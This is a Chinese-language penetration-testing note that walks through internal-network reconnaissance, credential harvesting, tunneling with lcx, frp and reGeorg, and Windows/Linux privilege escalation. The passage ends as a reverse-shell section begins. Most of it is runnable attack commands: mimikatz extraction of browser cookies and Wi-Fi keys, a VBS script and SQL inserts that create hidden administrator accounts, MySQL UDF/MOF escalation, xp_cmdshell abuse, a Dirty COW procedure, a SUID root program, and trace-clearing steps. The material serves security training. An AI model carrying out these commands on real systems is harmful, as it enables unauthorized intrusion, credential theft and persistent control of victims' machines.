---
title: "通过边界代理一路打到三层内网+后渗透通用手法"
onlyTitle: true
date: 2021-12-10 07:04:35
categories:
- 内网渗透
- 内网笔记
tags:
- 内网渗透
top: true
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B860.png

---

外网进内网通常就是通过web漏洞拿取shell

内网的很大一部分信息收集是围绕网络拓扑图展开的。可以社工运维或者google找一下。

# 内网扩散信息收集

概述

- 内网信息收集 
  * 内网网端信息：对内网进行拓扑、分区
  * 内网大小
- 内网核心业务信息
  * oa系统、邮件服务器、监控系统....
- 其他
  * Windows、linux主机信息收集


内网信息收集做的越好，打的越快

* 常用方法
  1. 主动扫描。常用工具: nmap,netdiscover,nc,masscan,自写脚本等
  2. 常用端口和服务探测
  3. 内网拓扑架构分析。如dmz,测试网等
  4. 命令收集
  5. 本机信息

>nmap的流量很大。因为nmap用了很多方式进行扫描，准确率高的同时流量较大，外网可以用
>主动扫描留下的痕迹很多且较难清楚。被动扫描需要的时间较长。视情况扫描

一般都是先扫80端口等。因为外网网站可能做的很好，内网网站烂的爆，sql注入、xss等web漏洞一把一把的。

### 主动扫描

1. ping命令扫描内网中的存活主机
   * 优点:方便，一般不会引起流量检测设备的报警
   * 缺点：扫描速度慢，目标开了防火墙会导致结果不准
2. nmap扫描存活主机(icmp扫描)
   * `nmap -sn -PE -n -v -oN 1.txt 目标ip`
   * 
   * 参数： -sn 不进行端口扫描;-PE 进行icmp echo扫描;-n 不进行反向解析;-v 输出调试信息;-oN输出
3. **nmap 扫描存活主机(arp扫描)**
   * `nmap -sn -PR -n -v 目标IP`
   * 参数：-PR代表arp扫描，在内网中arp扫描速度最快且准确率高
4. 使用netdiscover扫描(arp扫描工具，既可以主动扫描也可以被动嗅探)
   * `netdiscover -i eth0 -r 目标IP`
   * ![](https://storage.tttang.com/media/attachment/2022/10/29/e8b86246-4805-4a90-8563-0fc49b5dbbb5.png)
   * 参数说明:-i:指定一个接口;-r∶指定扫描范围
     + 注意: netdiscover时间越久越精确，可以发现某一台主机在一段时间内介入了那些网段，从而发现其他新的网段地址
5. 用nbtscan工具进行快速扫描存活PC端，同时获得NETBIOS(windows往上输入输出服务,139端口)
   * `nbtscan -r 目标IP`
   * ![](https://storage.tttang.com/media/attachment/2022/10/29/18af01a4-bc60-4d74-86a9-98bdffa39b1c.png)

### 端口和服务扫描

1. 探测目标开放端口
   * nmap探测：`nmap -Pn -n 目标IP`（禁ping扫描)
   * masscan扫描：`masscan -p 端口号 目标IP地址 --rate=10000` #用10kpps速度扫描端口
   * ![](https://storage.tttang.com/media/attachment/2022/10/29/e102c14c-fd01-4f8f-83f9-989c0bab605d.png)

2. 探测目标操作系统
   * 使用NSE脚本: `nmap --script smb-os-discovery.nse -p 445 目标IP地址`
     + 其中: smb-os-discovery.nse脚本通过smb来探测操作系统版本、计算机名、工作组名、域名等等信息。--script指定脚本
     + ![](https://storage.tttang.com/media/attachment/2022/10/29/35dde4b7-fb3d-440a-b6f9-1b88a19de252.png)

   * 使用nmap -O探测操作系统版本
     `nmap -O 目标IP`

3. 扫描主机存在的CVE漏洞
   * `nmap --script=vuln 目标IP`

### 内网常用命令

| 命令                                                         | 说明                   |
| ------------------------------------------------------------ | ---------------------- |
| net user                                                     | 本机用户列表           |
| net view                                                     | 查询同一域内的机器列表 |
| net localgroup administrators                                | 查看本机管理员         |
| net user /domain                                             | 查询域用户             |
| net group /domain                                            | 查询域里面的工作组     |
| net group "domain admins”/domain                             | 查询域管理员用户组     |
| net localgroup administrators /domain                        | 登陆本机的域管理员     |
| net localgroup administrators workgroup \user /add           | 域用户添加到本机       |
| net group "Domain controllers"                               | 查看域控               |
| /domain为域渗透参数。域管理有一台权限很高的机器，拿下之后能控制整个域的服务器，称为域控。 |                        |

* dsquery 域命令(后面再写域渗透)
  
| 命令                                                         | 作用                 |
| ------------------------------------------------------------ | -------------------- |
| dsquery computer domainroot -limit 65535 && net group "domain computers"/domain | 列出域中内所有机器名 |
| dsquery user domainroot -limit 65535 && net user /domain     | 列出该域内所有用户名 |
| dsquery subnet                                               | 列出该域内网段划分   |
| dsquery group && net group /domain                           | 列出该域内分组       |
| dsquery ou                                                   | 列出该域内组织单位   |
| dsquery server && net time /domain                           | 列出该域内控制器     |

## windows主机信息收集

这里是在拿下最高权限之后的信息收集。

* 主要收集内容

>1. 系统管理员密码(hash->明文)
>2. 其他用户的session，3389，ipc连接记录以及各用户回收站信息收集
>3. 浏览器密码和cookies的获取
>4. windows无线密码获取
>5. 数据库密码获取
>6. host文件，dns缓存信息
>7. 杀毒软件，补丁，进程，网络代理信息
>8. 共享文件夹，web服务器配置文件等
>9. 计划任务，账号密码策略，锁定策略

### windows杂七杂八的信息收集

* 工具：mimikatz、wce、getpass、quarkspwdump、reg-sam、pwdump7等

1. cmdkey用于保存用户名和密码的凭证。
   + `cmdkey /list`查看凭据位置
   + netpass.exe获取密码

2. 回收站信息获取
   + 进入回收站文件夹`cd C:$RECYCLE.BIN`（该文件夹为隐藏文件夹，dir /ah查看内容，a指定属性h表示隐藏)

3. 获取无线密码
   + `netsh wlan export profile interface=WLAN key=clear folder=C:\`

4. 获取浏览器的cookie和存储密码(chrome)
   + `%localappdata%\google\chrome\USERDATA\default\cookies%localappdata%\googlelchrome\USERDATA\default\Login`
   + Datachrome的用户信息保存在本地文件为sqlite数据库格式
   + 使用mimikatz读取内容:
     `mimikatz.exe privilege:debug log "dpapi:chrome /in:%localappdata%google\chrome\USERDATA\default\cookies /unprotect"`

### msf下的windows信息收集


| 模块                                      | 使用                       |
| ----------------------------------------- | -------------------------- |
| post/windows/gather/forensics/enum_drives | 获取目标主机的磁盘分区情况 |
| post/windows/gather/checkvm               | 判断目标主机是否为虚拟机   |
| post/windows/gather/enum_services         | 查看开启的服务             |
| post/windows/gather/enum_applications     | 查看安装的应用             |
| post/windows/gather/enum_shares           | 查看共享                   |
| post/windows/gather/dumplinks             | 查看目标主机最近的操作     |
| post/windows/gather/enum_patches          | 查看补丁信息               |
| scraper                                   | 导出多个信息               |
| use or run模块，设置参数后expoilt         |                            |

## linux信息收集

linux信息收集内容比起windows少很多

* **history命令**
  + 用于显示**历史执行命令**。能显示当前用户在本地计算机中执行的1000条命令。查看更多在/etc/profile文件中自定义HISTSIZE的变量值。
  + 使用history -c命令会清空所有命令的历史记录。
  + 每个用户的history不同

* **last命令**
  + 用于查看系统所有近期登录记录。
  + 执行last命令时，会读取/var/log/wtmp的文件。
    ![](https://storage.tttang.com/media/attachment/2022/10/29/be0bdb4e-2582-4010-8246-34b3f959c917.png)
  + 用户名 终端位置 登录IP或者内核 开始时间 结束时间
  + 如果是系统漏洞提权，不属于登录，无记录

* **arp -vn**
  + 聚类检查是否有**超同组业务外**的arp地址
  + mac地址对应ip固定，mac不对应ip则为arp欺骗

* /etc/hosts文件
  + 存储域名/主机名到ip映射关系

### msf下的linux收集


| 模块                                 | 使用                     |
| ------------------------------------ | ------------------------ |
| post/linux/gather/checkvm            | 判断目标主机是否为虚拟机 |
| post/linux/gather/enum_configs       | 查看配置信息             |
| post/linux/gather/enum_network       | 查看网络                 |
| post/linux/gather/enum_protections   | 查看共享                 |
| post/linux/gather/enum_system        | 查看系统和用户信息       |
| post/linux/gather/enum_users_histroy | 查看目标主机最近的操作   |
| post/linux/gather/hashdump           | 获取linux的hash          |


但是我仍要强调，被动收集很重要，内网被动收集要安全很多，但是周期很长。主动一分，就危险一分


## 收集内容总结

网卡信息、arp缓存、路由缓存、网站配置文件、数据库、访问日志、浏览器历史记录、netstat、hosts文件、history、hash、明文密码、网站配置账密、wifi、cmdkey



# 内网转发

* 内网转发的目的

>理论上通过网络连接的计算机都是可以互相访问的，但是因为技术原因没有实现。如局域网中某计算机仅开放web服务，则只能内网使用，外网无法直接访问。要让外网用户直接访问局域网服务，必须进行内网转发等操作
>![](https://storage.tttang.com/media/attachment/2022/10/29/8da8788c-be83-4362-a021-8414f20b8fa9.png)

* 内网转发原理
  通过服务器进行中转，将内部的**端口映射到公网IP**上，或者将内网端口**转发至外部服务器**。


* 内网转发的三种形式

>1. 端口转发
>
>>用于目标机器对某一端口的访问进行了限制。可以将本机的端口或者是本机可以访问到的任意主机的端口转发到任意一台你需要访问的公网IP上
>
>2. 端口映射
>
>>将一个内网无法访问的端口映射到公网的某个端口，进而进行攻击。比如:3389端口
>
>3. 代理转发
>
>>主要用于在目标机器上做跳板，进而可以对内网进行攻击

* 四种基本的网络情况
* * 攻击者有独立外网IP，拿到shell的服务器也有独立的外网IP
* * 攻击者有独立外网IP，拿到shell的服务器在内网，只有几个映射端口
* * 攻击者在内网，服务器也在内网只有几个映射端口
* * 攻击者在内网，服务器有独立外网IP

四种情况有不同拿下服务器的方式

## 端口转发

* 原理
  端口转发是转发一个**网络端口**从**一个网络节点到另一个网络节点**的行为。使一个外部用户从外部经过一个被激活的NAT路由器到达一个在私有内部IP地址(局域网内部）上的一个端口。
  简单地说︰端口转发就是将一个端口（这个端口可以本机的端口，也可以是本机可以访问到的任意主机的端口）转发到**任意一台可以访问到的IP**上，通常这个IP是公网ip
* 端口转发场景∶
  外网主机A已经可以任意连接内网主机B上的端口，但是无法访问内网主机C上的端口
  此时可以将C主机的端口转发到B主机的端口，那么外网主机A访问B主机的某某端口就相当于访问了C主机的某某端口
  ![](https://storage.tttang.com/media/attachment/2022/10/29/d6a37fdf-34be-4c25-8d13-9c30d6f6b7fc.png)

### 端口转发工具

#### lcx

>lcx是一个居于socket套接字实现的端口转发工具，有windows和linux两个版本，windows叫lcx.exe,linux叫portmap
>一个正常的socket隧道必须具备两端：服务器端和客户端

##### windows下：

>* 转发端口：`lcx.exe -slave 公网IP 端口 内网IP 端口`
>* 监听端口：`lcx.exe -listen 转发端口，本机任意没有没有被占用的端口`
>* 映射端口：`lcx.exe -tran 映射端口号 ip 目标端口`

* 本地端口映射:如果目标服务器由于防火墙的限制，部分端口的数据无法通过防火墙，可以将目标服务器相应端口的数据传到**防火墙允许的其他端口**
  `lcx.exe -tran 映射端口号 目标ip 目标端口`

* 内网端口转发：如下规则时，主机不能直接访问内网，这时就需要web服务器当**跳板**，也就是**代理**来使攻击机访问到内网主机
  ![](https://storage.tttang.com/media/attachment/2022/10/29/210124f1-baf9-436a-93c8-f7fd2ef87421.png)
  基本命令：
  ·转发端口`lcx.exe -slave 公网ip 端口 内网ip 端口`
  ·监听端口`lcx.exe -listen 转发端口 本机任意没有被占用端口`


>windows端口转发实例
>环境︰内网主机不能访问外网，但是可以访问同网段的内网机器，同时80端口只能本地访问，但是8080端口对外开放。
>
>>步骤一:被控服务器的80端口转发到本地的8080端口 `lcx -tran 8080 127.0.0.1 80`
>>步骤二∶在内网被控服务器上连接内网能够对外访问的服务器 `lcx -slave 192.168.56.1 4444 192.168.56.101 8080`
>>步骤三∶在能够对外访问的内网机器上监听端口 `lcx -listen 4444 12345`
>>步骤四∶外网机器访问192.168.56.1的12345端口也就是从**服务器12345->服务器4444->外网8080->内网80**
>>在外网192.168.64.230访问192.168.64.103:12345

##### linux下：

用法:	`./portmap -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-log filename]`
v:version

>-m:指定method action参数
>method=1:监听port1连接至主机2的port2(端口映射)
>method=2:监听Port1转发至port2
>method=3:连接主机1对应的端口和主机2对应的端口(端口转发)

如:`./portmap -m 2 -p1 6666 -h2 公网ip -p2 7777`//监听来自6666端口的请求并转发至7777

#### frp

* FRP(fast reverse proxy)是用go语言开发的**反向代理应用**，可以进行**内网穿透**
* frp支持tcp\udp\http\https

frp用处

>1. 利用处于**内网**或**防火墙**的机器，对外网提供http\https\tcp\udp服务
>2. 对于http,https服务支持基于域名的虚拟主机，支持自定义域名，是多个域名共用一个80端口

下载后frp文件内frps,frps.ini为服务端程序和配置文件，frpc,frpc.ini是客户端程序及配置文件

>* 服务端设置
>
>>修改frp.ini
>>文件格式：
>
>>```1
>>[common]
>>bind_port = 7000 #frp服务器监听㐰
>>dashboard_port = 7500 #web后台监听端口
>>dashboard_user =admin #web后台用户名及密码
>>dashboard_pwd = admin
>>token = 123456 #客户端和服务器的连接口令
>>```
>
>>运行frps服务器端 `./frps -c frps.ini` #-c意思是加载配置文件
>>访问x.x.x.x:7500，使用自己设置的用户名和密码登录
>
>* 客户端设置
>
>>修改frpc.ini文件
>
>>```1
>>[common]
>>server_addr = 192.168.152.217
>>#服务端IP地址
>>server_port = 7000
>>#服务器端口
>>token = 123456
>>#服务器上设置的连接口令
>>[http]
>>#自定义规则，[xxx]表示规则名
>>type = tcp
>>#type:转发的协议类型
>>local_ip = 127.0.0.1
>>local_port = 3389
>>#本地应用的端口号
>>remote_port = 7001
>>#这条规则在服务端开放的端口号
>>```
>
>>配置完成frp.ini后，cmd运行frpc(和服务端一样-c指定配置文件)
>>在局域网外客户端连接服务端的remote_port端口

该工具可跨平台，也就是windows exe程序连接linux
上述操作也就**相当于listen 7000转到7001**然后连接

#### metasploit portfwd

* 简介
  一款内置于meterpreter shell中的工具，直接访问攻击系统无法访问的机器。在可以访问攻击机和靶机的受损主机上运行此命令，可以通过本机转发TCP连接，成为一个支点。

>选项
>-L∶要监听的本地主机(可选). 
>-l : 要监听的本地端口，与此端口的连接将被转发到远程系统·
>-p∶要连接的远程端口，TCP连接将转发到的端口
>-r∶要连接的远程主机的IP地址
>参数
>Add :该参数用于**创建**转发
>`portfwd add -I 本地监听端口号 -p 目标端口号 -r 目标机IP地址`
>Delete :这将从转发端口列表中删除**先前的**条目. 
>`portfwd delete -I 本地监听端口号 -p 目标端口号 -r 目标机IP地址`
>List :**列出**当前转发的所有端口
>`portfwd list`
>Flush :这将删除转发列表中的**所有**端口

这个不太稳定，不如frp，lcx不怎么用了。


# 边界代理

代理类别：HTTP代理、socks代理、telnet代理、ssl代理
代理工具：EarthWorm、reGeorg(http代理)、proxifier(win)、sockscap64(win)、proxychains(linux)


内网通过代理连接外部网络为正向代理，外网通过代理连接内网为反向代理。
负载均衡服务器：将用户的请求分发到空闲服务器上。

* socks代理
  当通过代理服务器访问一个网站时，socks服务器起到了一个中间人的身份，分别与两方通信然后将结果告知另一方。只要配置好socks代理后无需指定**被访问目标**。
  socks和http代理走的是tcp流量，意思是udp的协议不能用这两种代理

* 代理和端口转发的异同：

| 代理              | 端口转发                   |
| ----------------- | -------------------------- |
| 需要socks协议支持 | 无需协议支持               |
| 一对多，访问网络  | 一对一，帮助他人访问某端口 |

socks代理可以理解为lcx端口转发，他在服务端监听一个服务端口，有连接请求时会从socks协议中解析出访问目标url的目标端口

**意思就是，有代理就不需要他娘的端口转发了，还指定端口转来转去脑子都转晕了，代理不需要那么多花里胡哨的。**

## **proxychains**

* proxychains是一个开源代理工具，可以在linux下全局代理。proxychains通过一个用户定义的代理列表强制连接指定的应用程序，支持http\socks4\socks5类型。
* 使用

>1. 在使用工具前要对工具进行配置，配置文件:/etc/proxychains.conf
>    删除dynamic_chain的注释
>    底部添加代理服务器
>    `proxychains 软件名`以代理启动任意软件

## regeorg工具

* regeorg主要是把内网服务器端口通过http/https隧道转发至本机，形成回路
* 用于目标服务器在**内网或做了端口策略**的情况下连接目标服务器内部开放端口
* 利用webshell建立一个socks代理进行内网穿透，则服务器必须支持aspx\php\jsp中的一种
* regeorg分为服务端和客户端。**服务端有php\aspx\jsp\node.js等多种，客户端为python**，所以用的时候文件里面找对应脚本

### regeorg使用

和proxychains结合使用

1. pip install安装

2. 假设服务器是php版本，将regeorg里的php上传到服务器，直接访问显示"georg says,'all seems fine'"，为正常运行
   ![](https://storage.tttang.com/media/attachment/2022/10/29/1937af61-ef7b-46ef-9a2b-2c44da3cc586.png)

3. 终端下运行:`python reGeorgSocksProxy.py -u 靶机reGeorg脚本地址 -p 本地监听端口`

4. 再起一个终端修改proxychains.conf配置文件，删除dynamic_chain的注释，在ProxyList最后加一行`socks5 127.0.0.1 本地监听端口`，并把其他的注释
   ![](https://storage.tttang.com/media/attachment/2022/10/29/86acdd55-5931-45f2-a10b-7c09d7eb41d5.png)

   代理就配置好了

5. 使用`proxychains 命令`，流量会自动从配置文件端口经过(python跑的脚本终端别关)

但是在msf外配置的代理,msf内部流量是不会走代理过的


## msf route

msf框架中自带路由转发功能，在已经获取meterpreter shell的基础上添加一条去往内网的路由
![](https://storage.tttang.com/media/attachment/2022/10/29/67351477-e0eb-4cf7-a460-01505220b4f7.png)
路由添加： `run autoroute -s 内网网端`
`run autoroute -p` 查看路由添加情况

## proxifiler

proxifiler为windows客户端代理工具，**socks5客户端**，可以让不支持通过代理服务器工作的程序通过https或socks5代理或代理链

* 支持socks4\socks5\http\tcp\udp。有gui
使用:profil配置代理ip和端口。proxification rules设置代理规则，不需要代理的设为direct模式

（但是个人在用shadowsocks...dddd)

﻿提权可以有好几种，本篇主要讲利用系统漏洞提权(最常规)和利用数据库提权。数据库这种利用第三方提权的方式通常比较少见


# windows权限提升

当我们getshell一个网站后，大部分情况下我们的权限是非常低的，这个时候提权可以让我们如拥有修改文件之类的强大能力。

一般来说，提权通常是改变用户

>windows: user -> system  user->administrator
>linux: user->root

* 提权的方式通常有：

1. 系统漏洞提权
2. 数据库提权
3. 第三方软件/服务提权
4. 系统配置错误提权

如果目的是download服务器文件或者拿下webshell等没必要提权，如果是为了做肉鸡或者上远控

##  系统漏洞提权

常规流程：**获得目标机shell->查看目标机补丁记录->判断没打的补丁，寻找EXP->利用exp提权**

1. cmd中systeminfo查看补丁安装情况
2. 使用补丁在线查询工具:`http://blog.neargle.com/win-powerup-exp-index/#`
3. 将systeminfo命令得到的补丁信息复制进去，就会给出可用的exp编号
4. github作者整合了大部分exp：`http://github.com/SecWiki/windows-kernel-exploits`(windows-kernel就是代表windows内核)
5. 将exp上传至目标机

* 每个EXP的使用方法不同。如ms14-058上传了exp到靶机后在cmd使用`exp.exe "命令"`就能以system权限执行命令。其他exp的使用方法很可能不同
* 获得了高权限在当前网络环境切忌开3389去连，可以用msfvenom生成木马维权，或者创建新用户加入管理员组。不过都会被发现。。
* 靶机上在运行msf木马时要用高权限运行，否则反弹回来的shell也是低权限。所以要用之前传上去的exp运行msf木马

## windows数据库提权

这种提权方式已经用的很少了

### mysql数据库提权

mysql提权的必要条件:获取Mysql数据库最高权限**root**的账号密码

>获取方法：
>
>1. 查看数据库配置文件
>2. 下载mysql安装路径下的数据文件并破解
>
>* 安装路径下的data存放的是数据库的信息，root的账号密码存放在mysql下的user表中，完整路径=安装路径+data+mysql+user.myd
>
>3. 暴力破解

**mysql的三种提权方式：**

1. udf提权
2. mof提权
3. 启动项提权

#### MOF提权

* 原理：利用了c:/windows/system32/wbem/mof/目录下的**nullevt.mof**文件。该文件每几秒会**执行**一次，向其中写入**cmd命令**使其被执行

* 利用条件

1. windows<= 2003
2. 对c:/windows/system32/wbem/mof/目录有读写权限
3. 可以时间写mof文件到相应目录，如：数据库允许外联，有webshell，有可写sql注入

因为需要有写文件权限(into outfile)，所以可用到的环境很少

* 提权方法

>1. 上传mof文件
>2. 执行load_file和into dumpfile将文件导出到指定位置
>    `select load_file('mof目标路径') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'`
>
>nullevt.mof文件的内容
>![](https://storage.tttang.com/media/attachment/2022/10/29/5b6b0a85-f8ae-48be-9f1d-6745b4226db6.png)

#### UDF提权

* 原理：UDF(user defined function)用户自定义函数通过添加新函数，对mysql服务器进行功能扩充，将mysql账号转化为system权限。
* 方式：通过root权限导出udf.dll到系统目录下，使udf.dell调用cmd

* 利用条件：

1. windows 2000\XP\2003
2. 账号对mysql有插入和删除权限
3. 对应目录有写权限

>mysql版本对应的udf.dll导出路径：
>
>| 数据库版本 | 操作系统     | udf.dll导出路径                         |
>| ---------- | ------------ | --------------------------------------- |
>| <5.0       | 所有操作系统 | 路径随意                                |
>| <=5.1      | windows2003  | c:\windows\system32\udf.dll             |
>| <=5.1      | windows2000  | c:\winnt\system32\udf.dll               |
>| >5.1       | 所有操作系统 | mysql**安装目录下的lib\plugin\udf.dll** |
>
>mysql安装目录查询语句： `select @@basedir`

* udf 提权步骤

1. select user();\version();\basedir()判断数据库版本、用户和安装目录
2. 如果\lib\plugin目录不存在，可以利用NTFS ADS流创建文件夹
   `select 'xxx' into dumpfile 'mysql目录\\lib:$INDEX_ALLOCATION';`
   `select 'xxx' into dumpfile 'mysql目录\\lib\plugin:$INDEX_ALLOCATION';`
   或者是webshell直接创建
3. 导入udf.dll文件。该文件在sqlmap/data/udf/mysql/目录下有，只是该dll文件是通过异或编码的，可以使用sqlmap/extra/cloak.py解密。
4. 上传udf.dll到指定目录。有webshell就直接传，传不了就select load_file()。
5. 创建自定义函数。`create function **sys_eval** returns string soname 'udf.dll';`
   必须要创建.dll文件中存在的函数才行，可以用十六进制编辑器打开udf.dll文件慢慢找函数，也可以用dumpbin.exe查看。soname指向动态链接库
6. 执行高权限指令：`select sys_eval('whoami');`
   将该用户提升为管理员权限：`select sys_eval("net localgroup administrators ichunqiu /add")`
7. 清除痕迹
   `drop function sys_eval;`
   `delete from mysql.func where name="sys_eval";`

#### 启动项提权

* 原理：windows开机时候都会有一些开机启动的程序，那时候启动的程序权限都是system，因为是system把他们启动的，利用这点，我们可以将自动化脚本写入启动项，达到提权的目的。将一段vbs脚本导入开机启动项，如果管理员重启了服务器，那么就会自动调用，并执行其中的用户添加及提权命令
* 利用条件：

1. 目标目录可读写
2. 调用的cmd要有足够权限
3. 重启服务器可以利用导致服务器蓝屏的exp，或者ddos

* 提权方式

1. 直接将vbs提权脚本上传到启动项目录下
2. sql命令创建添加vbs脚本

vbs提权脚本：

```
set wsnetwork=CreateObject("WSCRIPT.NETWORK")
os="WinNT://"&wsnetwork.ComputerName
Set ob=GetObject(os) #得到adsi接口
Set oe=GetObject(os&"/Administrators,group") #用户组
Set od=ob.Create("user","name") #name为用户名
od.SetPassword "passwd" #passwd为密码
od.SetInfo #保存
Set of=GetObject(os&"/name",user) #得到用户
oe.add os&"/name"
```

* sql命令创建

1. 连接到对方MySQL服务器,进入后查看数据库中有哪些数据表

* 命令:show tables
* 默认的情况下，test中没有任何表的存在。

2. 进入test数据库，并创建一个新的表:
   `create table a(cmd text)`//创建了一个新的表，名为a，表中只存放了一个字段，字段名为cmd，为text文本

3. 在表中插入内容，用这三条命令来建立一个VBS的脚本程序:

`insert into a values("set wshshell=createobject(""wscript.shell"")");`
`insert into a values("a=wshshell.run(""cmd.exe /c net user name passwd /add"",0)");`
`insert into a values("b=wshshell.run(""cmd.exe /c net localgroup administrators name /add"",0)");`

4. 输出表为一个VBS的脚本文件
   `select * from a into dumpfile "C:\Documents and Settings\Administrator\「开始」菜单\程序\启动1.vbs";`

5. 利用其他手段重启电脑

### sql server提权

* 利用条件

1. 必须获得sa的账号密码或者与sa相同给权限的账号密码，且mssql没有被降权
2. 能执行sql语句。如webshell或者1433端口连接

在windows，sa账号通常是被降权为db-owner的。而不是sysadmin

* 获取sa号密的方法：

> 1. webshell或源码获取。一般在网站的配置文件中存了明文账号密码，常用配置文件如：conn.aspx、config.aspx、config.php等
>    一般格式如：server=localhost;UID=sa;PWD=passwd;database=db
> 2. 源码泄露
> 3. 嗅探。在局域网中用Cain等工具进行arp嗅探的时候可以抓取到1433端口的数据库明文登录
> 4. 暴力破解

#### xp_cmdshell提权

>* xp_cmdshell:
>
>1. 存储过程：是存储在SQLServer中预先定义好的"sql语言集合"，使用T-SQL语言编写好的脚本共同组成的集合体为存储过程
>2. xp_cmdshell脚本：扩展存储过程的脚本，是危险性最高的脚本，可以执行操作系统的任何指令
>3. xp_cmdshell在mssql2000中是默认开启的，在mssql2005后的版本中默认禁止。如果用户具有sa权限可以用sp_configure重新开启




xp_cmdshell提权过程：
（2005以前的版本):

1. 连接数据库：
   `select ame from master.dbo.sysdatabases`获取所有的数据库名
2. 查看当前版本`select @@version`
   判断当前是否为sa`select is_srvrolemember('sysadmin')`
   判断是否有public权限`select is_srvrolemember('public')`
   判断是否有读写文件权限`select is_srvrolemember('db_owner')`
3. 查看数据库中是否有xp_cmdshell扩展存储插件，return 1则有
   `select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell';`


（2005后的版本)：

1. 开启xp_cmdshell

```exec sp_configure 'show advance options',1;//允许修改高级参数
reconfigure;
exec sp_configure 'xp_cmshell',1;//打开xp_cmdshell扩展
reconfigure;
```

2. xp_cmdshell执行命令

```exec master..xp_cmdshell 'net user name passwd /add'//添加用户name,密码passwd
exec master..xp_cmdshell 'net localgroup administrators name /add'//添加name到管理员组
```

### windows bypass uac

uac(user acount control)可以阻止未授权的应用程序自动安装，并防止无意中更改系统设置

>uac的三种设置要求：
>
>1. 始终通知
>2. 仅在系统试图更改我的计算机时通知（Uac默认设置，第三方使用高级别权限时会提示本地用户)
>3. 从不提示(用户为系统管理员时所有程序都会以最高权限运行)

相当于普通用户打开cmd和以管理员运行cmd的差别，普通用户以管理员身份开cmd就会受到uac的限制，输入管理员密码

#### msf bypass uac

前提：已经获得了目标机器的meterpreter shell，当前权限为普通用户

* bypassuac模块通过进程注入，利用受信任的发布者证书绕过windows UAC,它将为我们生成另一个关闭UAC的shell
* bypassuac_injection模块直接运行在内存的反射DLL中，不会接触目标机的硬盘，从而降低了被杀毒软件检测出来的概率
* bypassuac_eventwr模块通过在当前用户配置单元下劫持注册表中的特殊键，在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC

msf exploit:>`use exploit/windows/local/bypassuac`
然后根据msf exp对reverse_tcp(bind_tcp)、lhost等进行参数设置

#### 利用系统漏洞bypass uac

CVE编号:CVE-2019-1388,windwos证书对话框特权提升漏洞。补丁号KB4524235 KB4525233

* 漏洞原理：此漏洞是因为UAC机制设定不严导致的。默认wdnows会在一个单独的桌面secure desktop上显示所有UAC提示。这些提示是由consent.exe的可执行文件生成的，该文件以NT AUTHORITY\SYSTEM身份运行，并有system的完整权限

>如果在运行一个可执行文件时触发了UAC，在点击 展示证书发行者的详细信息 之后，证书里的Issued by字段，这个字段对应的值就是OID。证书会解析OID的值，windows没有禁用OID处的超链接，就可以利用提权

要能连3389

@[toc]

# Linux提权

linux提权相对于windows的手法较单一，多了一个比较重要的suid提权。有很多时候提权并不是必须进行的步骤

## linux系统提权

linux和内核提权跟windows一样，都要下载对应漏洞的脚本提权

uname -a 获取操作系统内核版本和内核架构
id 获取用户信息

1. 查找相关版本的内核漏洞

* exp搜索链接：`https://www.exploit-db.com/` (type选local)
* exp下载：`http://github.com/SecWiki/linux-kernel-exploits`
  （科学上网）

2. 上传exp并编译
   exp是.c文件，上传到服务器后需要用gcc编译。.cpp用g++
   编译 `gcc pwn.c -o pwn` (exp下载文件里有对应的编译说明文档）
   运行 `./pwn`
   如果目标机没有gcc或者g++，自己没有权限也肯定不能安装。唯一的办法是在本地搭建一个和服务器内核版本相同的环境，在里面编译完成了再上传至靶机

windows提权成功后在exp后接命令就是高权限运行，但是linux提权成功是返回一个shell。脚本执行后返回shell失败，可能是需要反弹shell


#### 脏牛提权实例

1. id查看目标机用户权限
2. uname -a目标机的linxu kernel>=2.6.22进行脏牛提权
3. 寻找对应exp `http://github/FireFart/dirtycow
4. exp下载至目标机并编译 `gcc -pthread dirty.c -o dirty -lcrypt`
5. 完成后，销毁firefart密码文件即可恢复root
   `mv /tmp/passwd.bak /etc/passwd`


获取shell后将shell转换为完全交互式的TTY：`python -c 'import pty;pty.spawn("/bin/bash")'`

## suid提权

此处涉及权限划分的知识。在Linux中通过权限位rwx实现文件权限管理。d目录，-普通文件。r read;w write;x execute
![](https://storage.tttang.com/media/attachment/2022/10/29/34a39b9b-d6ee-46d4-b30c-e1541d6bd09a.png)
所有者-所属者-其他用户

* suid作用于二进制可执行程序上，当执行程序时会临时切换身份为文件所有者身份为文件所有者身份。
  `chmod u+s FILE\chmod 4755 FILE` 添加SUID权限到二进制文件（在三位数据权限前，4代表添加到SUID位）
  `chmod u-s FILE\chmod 0xxx FILE` 删除suid
  ![](https://storage.tttang.com/media/attachment/2022/10/29/80b68f50-42f7-4a7a-aea3-ff233dc22f79.png)
* 文件属主为s表示设置了suid.没有x权限用大写S，表示权限无效

简而言之，任何用户执行有suid的文件时，都会以第一个权限运行

>所以利用suid提权的一个小案例就是：
>创建一个1.c文件,代码如下：
>
>```c
>#include<unistd.h>
>void main(){
>setuid(0); #root的uid=0，意味着执行后面的代码是root权限在执行
>system("su - root);#将当前环境转为root
>}
>```
>
>gcc 1.c -o 1编译
>chmod u+s 1 添加suid
>./1 执行
>su - root !=su root.su 只是切换了root身份，但shell环境依旧是普通用户，su - 用户和环境一起切换了。

## linux数据库提权

和windows一样的，udf提权

* 环境要求：配置中secure_file_priv=""，
  mysql具有root权限，具有sql语句执行权限，目录可读可写，selinux关闭


先获取低权限shell,提权过程：
![](https://storage.tttang.com/media/attachment/2022/10/29/f70d3b9a-84a7-46e5-be32-45cf0a28b84b.png)

1. 查看plugin目录路径 `show variables like '%plugin%';`
   `select unhex('udf十六进制') into dumpfile 'usr/lib64/mysql/plugin/1.so';` (plugin路径/1.so)
2. 声明函数 `create function sys_eval returns string soname '1.so';`
3. 执行高权限命令 `select sys_eval('whoami');`
4. 清除痕迹 `drop function sys_eval;`

windows soname动态链接库指向udf.dll，linux指向.so文件，所以声明的函数也要是.so文件里的。
详情请见上篇windows提权

# 反弹shell

* 反弹shell使用场景:防火墙会阻止客户端主动连接服务器，但是服务器连接客户端通过防火墙时，可以穿透到达客户端

## nc

netcat简称nc，被称为渗透测试中的瑞士军~~~~刀。
